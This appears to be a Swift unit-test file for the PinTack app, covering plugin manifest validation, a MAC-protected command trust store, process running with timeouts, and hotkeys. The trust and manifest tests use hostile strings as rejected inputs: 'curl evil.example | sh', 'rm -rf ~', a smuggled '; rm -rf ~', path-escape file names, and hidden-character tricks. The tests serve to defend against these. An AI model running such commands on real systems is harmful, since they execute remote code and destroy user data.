import XCTest
import Darwin
@testable import PinTack

// MARK: - Manifests (untrusted input: anyone can hand you a plugin folder)

final class PluginManifestTests: VaultTestCase {

    private func folder(_ id: String, files: [String] = ["main.js", "styles.css"]) throws -> URL {
        let dir = root.appendingPathComponent("plugins/\(id)", isDirectory: true)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        for f in files { try "x".write(to: dir.appendingPathComponent(f), atomically: true, encoding: .utf8) }
        return dir
    }

    private func manifest(id: String = "demo", main: String = "main.js", styles: String? = "styles.css",
                          permissions: [String]? = ["url.open"], minApp: String? = "0.1.0",
                          settings: [PluginSettingSpec]? = nil) -> PluginManifest {
        PluginManifest(id: id, name: "Demo", version: "1.0.0", description: nil, author: nil, minAppVersion: minApp,
                       main: main, styles: styles, permissions: permissions, settings: settings)
    }

    private func check(_ m: PluginManifest, folderName: String = "demo", files: [String] = ["main.js", "styles.css"]) throws {
        try m.validate(folderName: folderName, folder: try folder(folderName, files: files), appVersion: "0.1.0", reserved: AppSettings.reservedKeys)
    }

    func testAValidManifestPasses() throws { XCTAssertNoThrow(try check(manifest())) }

    func testTheShippedRunnerManifestIsValid() throws {
        let repo = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().appendingPathComponent("Plugins/runner")
        let m = try XCTUnwrap(PluginManager.readManifest(in: repo))
        XCTAssertNoThrow(try m.validate(folderName: "runner", folder: repo, appVersion: "0.1.0", reserved: AppSettings.reservedKeys))
        XCTAssertEqual(Set(m.declaredPermissions), [.processExecute, .shortcutsRun, .urlOpen, .pathReveal])
        XCTAssertEqual(m.settings?.map(\.key), ["timeout", "shell"])
    }

    func testIdRules() {
        for bad in ["A", "x", "has space", "-lead", "../x", "UPPER", "a/b", String(repeating: "a", count: 41)] {
            XCTAssertThrowsError(try check(manifest(id: bad), folderName: "demo"), "id \(bad) must be rejected")
        }
        XCTAssertThrowsError(try check(manifest(id: "other"), folderName: "demo"), "id must equal the folder name")
    }

    func testAnIdCannotCollideWithAnAppSettingsKey() {
        // Plugin values are stored in settings.json under the plugin's id; "fontsize"-style collisions would corrupt app settings.
        for reserved in ["plugins", "enabledplugins", "spellcheck"] where AppSettings.reservedKeys.contains(reserved) {
            XCTAssertThrowsError(try check(manifest(id: reserved), folderName: reserved))
        }
        XCTAssertTrue(AppSettings.reservedKeys.contains("plugins"))
        XCTAssertTrue(AppSettings.reservedKeys.contains("enabledPlugins"))
    }

    func testFileNamesCannotEscapeTheFolder() {
        for bad in ["../evil.js", "sub/main.js", "/etc/passwd.js", ".hidden.js", "..\\x.js", ""] {
            XCTAssertThrowsError(try check(manifest(main: bad)), "main \(bad.debugDescription) must be rejected")
        }
        XCTAssertThrowsError(try check(manifest(styles: "../x.css")))
        XCTAssertThrowsError(try check(manifest(main: "main.txt")), "main must be a .js file")
        XCTAssertThrowsError(try check(manifest(styles: "styles.js")), "styles must be a .css file")
    }

    func testMissingFilesAndUnknownPermissionsAreRejected() {
        XCTAssertThrowsError(try check(manifest(), files: ["styles.css"]))
        XCTAssertThrowsError(try check(manifest(permissions: ["process.execute", "network.fetch"])))
        XCTAssertThrowsError(try check(manifest(permissions: ["fs.read"])))
    }

    func testVersionGateAndSettingsSchema() {
        XCTAssertThrowsError(try check(manifest(minApp: "9.0.0")))
        XCTAssertNoThrow(try check(manifest(minApp: "0.1.0")))
        XCTAssertThrowsError(try check(manifest(settings: [PluginSettingSpec(key: "bad key", type: "string", label: "x", defaultValue: .string(""))])))
        XCTAssertThrowsError(try check(manifest(settings: [PluginSettingSpec(key: "ok", type: "object", label: "x", defaultValue: .string(""))])))
        XCTAssertNoThrow(try check(manifest(settings: [PluginSettingSpec(key: "ok", type: "number", label: "x", defaultValue: .number(3))])))
    }

    func testVersionComparisonIsNumericNotAlphabetic() {
        XCTAssertEqual(PluginManifest.compare("0.10.0", "0.9.0"), .orderedDescending)
        XCTAssertEqual(PluginManifest.compare("1.0", "1.0.0"), .orderedSame)
        XCTAssertEqual(PluginManifest.compare("0.1.0", "0.1.1"), .orderedAscending)
    }
}

// MARK: - Trust (the approval that guards command execution)

final class TrustStoreTests: XCTestCase {

    var dir: URL!
    var file: URL { dir.appendingPathComponent("trust.json") }
    var key: URL { dir.appendingPathComponent("mac-a.key") }

    override func setUpWithError() throws {
        dir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("pt-trust-\(UUID().uuidString)", isDirectory: true).resolvingSymlinksInPath()
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    }
    override func tearDownWithError() throws { try? FileManager.default.removeItem(at: dir) }

    private func k(_ cmd: String, cwd: String = "/tmp", kind: TrustKey.Kind = .command) -> TrustKey { TrustKey(kind: kind, value: cmd, cwd: cwd) }

    func testApprovalIsBoundToTheExactCommand() {
        let s = TrustStore(fileURL: file, keyURL: key)
        s.approve(k("./deploy.sh"))
        XCTAssertTrue(s.isTrusted(k("./deploy.sh")))
        XCTAssertFalse(s.isTrusted(k("./deploy.sh ")), "one extra space is a different command")
        XCTAssertFalse(s.isTrusted(k("./deploy.sh; rm -rf ~")))
        XCTAssertFalse(s.isTrusted(k("./Deploy.sh")))
    }

    func testTheSameCommandInAnotherFolderIsNotApproved() {
        let s = TrustStore(fileURL: file, keyURL: key)
        s.approve(k("./run.sh", cwd: "/Users/me/safe"))
        XCTAssertFalse(s.isTrusted(k("./run.sh", cwd: "/Users/me/other")), "the same relative script elsewhere is a different program")
    }

    func testACommandAndAShortcutWithTheSameTextAreDifferent() {
        let s = TrustStore(fileURL: file, keyURL: key)
        s.approve(k("Backup", cwd: "", kind: .shortcut))
        XCTAssertFalse(s.isTrusted(k("Backup", cwd: "", kind: .command)))
    }

    func testApprovalsPersistAndCanBeRevoked() {
        let a = TrustStore(fileURL: file, keyURL: key)
        a.approve(k("one")); a.approve(k("two"))
        let b = TrustStore(fileURL: file, keyURL: key)
        XCTAssertTrue(b.isTrusted(k("one")) && b.isTrusted(k("two")))
        XCTAssertEqual(Set(b.all.map(\.value)), ["one", "two"])
        b.revoke(hash: k("one").hash)
        XCTAssertFalse(TrustStore(fileURL: file, keyURL: key).isTrusted(k("one")))
        b.revokeAll()
        XCTAssertTrue(TrustStore(fileURL: file, keyURL: key).all.isEmpty)
    }

    func testAForgedEntryInTheVaultFileDoesNotApproveAnything() throws {
        // Someone who can write your vault (a shared folder) adds an entry for a command they want run.
        _ = TrustStore(fileURL: file, keyURL: key)
        let evil = k("curl evil.example | sh")
        let forged: [String: [String: String]] = [evil.hash: ["kind": "run", "command": evil.value, "cwd": evil.cwd,
                                                              "approvedAt": ISO8601DateFormatter().string(from: Date()), "mac": String(repeating: "0", count: 64)]]
        try JSONSerialization.data(withJSONObject: forged).write(to: file)
        XCTAssertFalse(TrustStore(fileURL: file, keyURL: key).isTrusted(evil))
    }

    func testATrustFileSyncedFromAnotherMacIsNotTrustedHere() throws {
        let otherMac = TrustStore(fileURL: file, keyURL: dir.appendingPathComponent("mac-b.key"))
        otherMac.approve(k("legit but approved elsewhere"))
        XCTAssertTrue(otherMac.isTrusted(k("legit but approved elsewhere")))
        // The same trust.json arrives on this Mac, which has its own secret.
        XCTAssertFalse(TrustStore(fileURL: file, keyURL: key).isTrusted(k("legit but approved elsewhere")),
                       "approvals belong to a person on a Mac, not to a vault that gets synced")
    }

    func testEditingTheCommandTextInsideAnEntryInvalidatesIt() throws {
        let s = TrustStore(fileURL: file, keyURL: key)
        s.approve(k("echo safe"))
        var raw = try XCTUnwrap(JSONSerialization.jsonObject(with: Data(contentsOf: file)) as? [String: [String: String]])
        let hash = k("echo safe").hash
        raw[hash]?["command"] = "rm -rf ~"                       // keep the hash and MAC, swap the text
        try JSONSerialization.data(withJSONObject: raw).write(to: file)
        let reloaded = TrustStore(fileURL: file, keyURL: key)
        XCTAssertFalse(reloaded.isTrusted(k("echo safe")))
        XCTAssertFalse(reloaded.isTrusted(k("rm -rf ~")))
    }

    func testTheKeyFileIsPrivateAndStable() throws {
        let s = TrustStore(fileURL: file, keyURL: key)
        s.approve(k("x"))
        let attrs = try FileManager.default.attributesOfItem(atPath: key.path)
        XCTAssertEqual((attrs[.posixPermissions] as? NSNumber)?.intValue, 0o600)
        XCTAssertEqual(try Data(contentsOf: key).count, 32)
        let before = try Data(contentsOf: key)
        _ = TrustStore(fileURL: file, keyURL: key)
        XCTAssertEqual(try Data(contentsOf: key), before, "the secret must not be regenerated on every launch")
    }

    // Text that renders differently from how it executes must never reach the approval window.
    func testCommandsThatCouldHideTheirRealContentAreRefused() {
        XCTAssertNoThrow(try TrustKey.validate("echo hi\npython3 -c \"print('é ☃')\"\ttab"))
        for bad in ["echo a\u{1B}[2K rm", "echo a\0b", "echo \u{202E}txt.sh", "echo \u{2066}x", "echo a\u{200B}b", "a\u{7F}b", "a\u{85}b", "a\u{FEFF}b"] {
            XCTAssertThrowsError(try TrustKey.validate(bad), "should refuse \(bad.debugDescription)")
        }
        XCTAssertThrowsError(try TrustKey.validate(String(repeating: "a", count: 20_000)))
    }
}

// MARK: - Running processes (real ones)

final class ProcessRunnerTests: XCTestCase {

    private struct Run { var out = "", err = "", result: ProcessRunner.Result? }

    @discardableResult
    private func run(_ script: String, cwd: URL = URL(fileURLWithPath: NSTemporaryDirectory()), timeout: TimeInterval = 10,
                     environment: [String: String]? = nil, stopAfter: TimeInterval? = nil) -> Run {
        var r = Run()
        let done = expectation(description: "finished")
        let handle = ProcessRunner().start(executable: "/bin/sh", arguments: ["-c", script], cwd: cwd, timeout: timeout,
                                           environment: environment ?? ProcessInfo.processInfo.environment,
                                           onOutput: { kind, text in if kind == .stdout { r.out += text } else { r.err += text } },
                                           completion: { r.result = $0; done.fulfill() })
        if let stopAfter { DispatchQueue.main.asyncAfter(deadline: .now() + stopAfter) { handle.stop() } }
        wait(for: [done], timeout: 20)
        return r
    }

    func testStdoutStderrAndExitCodeAreSeparate() {
        let r = run("echo hi; echo oops 1>&2; exit 3")
        XCTAssertEqual(r.out, "hi\n"); XCTAssertEqual(r.err, "oops\n")
        XCTAssertEqual(r.result?.exitCode, 3)
        XCTAssertEqual(r.result?.timedOut, false); XCTAssertEqual(r.result?.stopped, false)
    }

    func testTheWorkingFolderIsHonoured() {
        let dir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("pt-cwd-\(UUID().uuidString)").resolvingSymlinksInPath()
        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        // `pwd` reports the physical path (/private/var/...); ask the OS for the same thing.
        var buffer = [CChar](repeating: 0, count: Int(PATH_MAX))
        let physical = realpath(dir.path, &buffer) != nil ? String(cString: buffer) : dir.path
        XCTAssertEqual(run("pwd", cwd: dir).out.trimmingCharacters(in: .whitespacesAndNewlines), physical)
    }

    func testAScriptCannotWaitOnTheKeyboard() {
        let r = run("cat; echo done")                // stdin is /dev/null, so cat ends at once
        XCTAssertEqual(r.out, "done\n"); XCTAssertEqual(r.result?.exitCode, 0)
    }

    func testTimeoutKillsTheCommand() {
        let started = Date()
        let r = run("sleep 30", timeout: 0.6)
        XCTAssertEqual(r.result?.timedOut, true)
        XCTAssertLessThan(Date().timeIntervalSince(started), 5)
    }

    func testStopKillsTheCommand() {
        let started = Date()
        let r = run("sleep 30", stopAfter: 0.4)
        XCTAssertEqual(r.result?.stopped, true); XCTAssertEqual(r.result?.timedOut, false)
        XCTAssertLessThan(Date().timeIntervalSince(started), 5)
    }

    func testStoppingAlsoKillsChildProcesses() throws {
        // `sh -c 'sleep 40 & echo $!; wait'`: the child would outlive a naive terminate of the shell.
        let r = run("sleep 41 & echo $!; wait", stopAfter: 0.6)
        let pid = try XCTUnwrap(Int32(r.out.trimmingCharacters(in: .whitespacesAndNewlines)))
        Thread.sleep(forTimeInterval: 0.5)
        XCTAssertNotEqual(kill(pid, 0), 0, "the child process must not be left running")
        if kill(pid, 0) == 0 { kill(pid, SIGKILL) }
    }

    func testOutputBeyondTheLimitIsTruncatedNotBuffered() {
        let r = run("head -c 3000000 /dev/zero | tr '\\0' 'a'")
        XCTAssertEqual(r.result?.truncated, true)
        XCTAssertLessThanOrEqual(r.out.utf8.count, ProcessRunner.outputLimit)
        XCTAssertGreaterThan(r.out.utf8.count, 1_000_000)
    }

    func testAMultiByteCharacterSplitAcrossReadsIsNotCorrupted() {
        let r = run("printf '\\342\\202'; sleep 0.3; printf '\\254'; echo")   // the two halves of "€" arrive separately
        XCTAssertEqual(r.out, "€\n")
    }

    func testABadProgramReportsAnErrorInsteadOfHanging() {
        var out = "", result: ProcessRunner.Result?
        let done = expectation(description: "done")
        ProcessRunner().start(executable: "/nonexistent/shell", arguments: [], cwd: URL(fileURLWithPath: "/tmp"), timeout: 5,
                              onOutput: { _, t in out += t }, completion: { result = $0; done.fulfill() })
        wait(for: [done], timeout: 5)
        XCTAssertEqual(result?.exitCode, 127); XCTAssertTrue(out.contains("Could not start"))
    }

    func testShellAndFolderResolution() {
        XCTAssertEqual(ProcessRunner.resolveShell(override: nil, environment: ["SHELL": "/bin/sh"]), "/bin/sh")
        XCTAssertEqual(ProcessRunner.resolveShell(override: "", environment: ["SHELL": "/bin/sh"]), "/bin/sh")
        XCTAssertEqual(ProcessRunner.resolveShell(override: "/bin/bash", environment: [:]), "/bin/bash")
        XCTAssertNil(ProcessRunner.resolveShell(override: "/no/such/shell", environment: [:]), "a bad override is an error, not silently replaced")
        XCTAssertNil(ProcessRunner.resolveShell(override: "bash", environment: [:]), "must be an absolute path")
        XCTAssertEqual(ProcessRunner.resolveShell(override: nil, environment: [:]), "/bin/zsh")
        XCTAssertEqual(ProcessRunner.resolveDirectory("~")?.path, NSHomeDirectory())
        XCTAssertEqual(ProcessRunner.resolveDirectory("  ")?.path, NSHomeDirectory())
        XCTAssertNil(ProcessRunner.resolveDirectory("/definitely/not/here"))
        XCTAssertNil(ProcessRunner.resolveDirectory("relative/path"))
        XCTAssertNil(ProcessRunner.resolveDirectory("/etc/hosts"), "a file is not a folder")
    }

    /// The login-shell trap (CLAUDE.md trap 3): a login shell must be able to see tools that the minimal GUI PATH cannot.
    func testALoginShellSeesAPathTheBareEnvironmentDoesNot() throws {
        let home = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("pt-home-\(UUID().uuidString)").resolvingSymlinksInPath()
        try FileManager.default.createDirectory(at: home.appendingPathComponent("tools"), withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: home) }
        try "export PATH=\"\(home.path)/tools:$PATH\"\n".write(to: home.appendingPathComponent(".zprofile"), atomically: true, encoding: .utf8)
        let tool = home.appendingPathComponent("tools/pintack-probe")
        try "#!/bin/sh\necho probe-ran\n".write(to: tool, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: tool.path)

        let env = ["HOME": home.path, "PATH": "/usr/bin:/bin", "ZDOTDIR": home.path]     // what a Dock-launched app roughly has
        func go(_ args: [String]) -> Run {
            var r = Run(); let done = expectation(description: "shell")
            ProcessRunner().start(executable: "/bin/zsh", arguments: args, cwd: home, timeout: 10, environment: env,
                                  onOutput: { k, t in if k == .stdout { r.out += t } else { r.err += t } }, completion: { r.result = $0; done.fulfill() })
            wait(for: [done], timeout: 15); return r
        }
        XCTAssertNotEqual(go(["-c", "pintack-probe"]).result?.exitCode, 0, "without a login shell the tool must NOT resolve")
        let login = go(["-lc", "pintack-probe"])
        XCTAssertEqual(login.out, "probe-ran\n", "through a login shell it must resolve: stderr=\(login.err)")
    }
}

// MARK: - Plugin command hotkeys

final class PluginHotkeyTests: VaultTestCase {

    func testHotkeyStringsParse() {
        XCTAssertEqual(KeyCombo.parse("Alt+Cmd+R")?.display, "⌥⌘R")
        XCTAssertEqual(KeyCombo.parse("ctrl+shift+k")?.display, "⌃⇧⌘K".replacingOccurrences(of: "⌘", with: ""))
        XCTAssertEqual(KeyCombo.parse("Mod-Alt-7")?.display, "⌥⌘7")
        XCTAssertEqual(KeyCombo.parse("Cmd+,")?.display, "⌘,")
    }

    func testMalformedHotkeysAreRejectedNotGuessed() {
        for bad in ["", "R", "Shift+R", "Alt+Cmd", "Alt+Cmd+R+T", "Alt+Cmd+Banana", "Hyper+R", "+++"] {
            XCTAssertNil(KeyCombo.parse(bad), bad.debugDescription)
        }
    }

    func testAPluginCommandBindingPersistsAndOverridesItsDefault() throws {
        let cmd = PluginCommand(key: "runner:run-all", pluginID: "runner", id: "run-all", name: "Run all", defaultHotkey: "Alt+Cmd+R")
        let s = ShortcutStore()
        s.load(from: store.metaURL)
        XCTAssertEqual(s.pluginCombo(for: cmd)?.display, "⌥⌘R", "the manifest default applies until the user rebinds")
        let mine = KeyCombo(keyCode: 38, modifiers: KeyCombo.optCmd)         // ⌥⌘J
        s.setPlugin(mine, for: cmd)
        XCTAssertEqual(s.pluginCombo(for: cmd), mine)

        let reloaded = ShortcutStore()
        reloaded.load(from: store.metaURL)
        XCTAssertEqual(reloaded.pluginCombo(for: cmd), mine)
        reloaded.setPlugin(nil, for: cmd)
        XCTAssertEqual(reloaded.pluginCombo(for: cmd)?.display, "⌥⌘R", "clearing goes back to the default")
    }

    func testPluginBindingsAndAppBindingsShareOneFileWithoutClobberingEachOther() throws {
        let cmd = PluginCommand(key: "p:c", pluginID: "p", id: "c", name: "C", defaultHotkey: nil)
        let s = ShortcutStore(); s.load(from: store.metaURL)
        s.set(KeyCombo(keyCode: 38, modifiers: KeyCombo.optCmd), for: .pin)
        s.setPlugin(KeyCombo(keyCode: 40, modifiers: KeyCombo.optCmd), for: cmd)
        let again = ShortcutStore(); again.load(from: store.metaURL)
        XCTAssertEqual(again.combo(for: .pin).display, "⌥⌘J")
        XCTAssertEqual(again.pluginCombo(for: cmd)?.display, "⌥⌘K")
    }
}
